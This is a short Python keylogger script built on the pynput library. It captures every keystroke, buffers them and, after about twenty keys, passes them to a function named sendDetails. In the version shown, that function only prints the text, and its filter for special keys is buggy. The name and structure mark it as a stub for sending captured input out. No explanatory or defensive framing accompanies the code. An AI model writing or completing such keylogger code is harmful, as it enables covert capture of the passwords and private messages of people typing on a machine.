import pynput
from pynput.keyboard import Key,Listener

count=0
keys=[]

def onPress(key):
    global count, keys
    keys.append(str(key))
    count+=1
    if count>20:
        count=0
        sendDetails(keys)

def sendDetails(keys):
    message=""
    for i in keys:
        k=i.replace("'","")
        if i == "Key.space":
            k = " "
        elif i.find("Key")>0:
            k=""
        message+=k
    print(message)

def onRelease(key):
    if key == Key.esc:
        return False

with Listener(on_press=onPress,on_release=onRelease) as x :
    x.join()
